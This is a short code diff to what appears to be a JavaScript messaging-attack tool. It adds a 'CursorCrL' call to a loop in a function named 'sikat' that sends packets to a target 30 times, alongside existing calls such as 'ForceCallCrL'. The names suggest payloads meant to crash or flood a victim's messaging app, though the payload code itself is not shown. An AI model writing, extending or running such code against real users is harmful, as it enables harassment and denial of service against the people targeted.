@@ -1130,6 +1130,7 @@ async function sikat(sock, target) {
     for (let i = 0; i < 30; i++) {
         //await AB1(sock, target, true)
         //await AB2(sock, target, true)
+        await CursorCrL(sock, target)
         await ForceCallCrL(sock, target)
         await F(sock, target)
         console.log(`${i} sikat Packet To ${target}`)
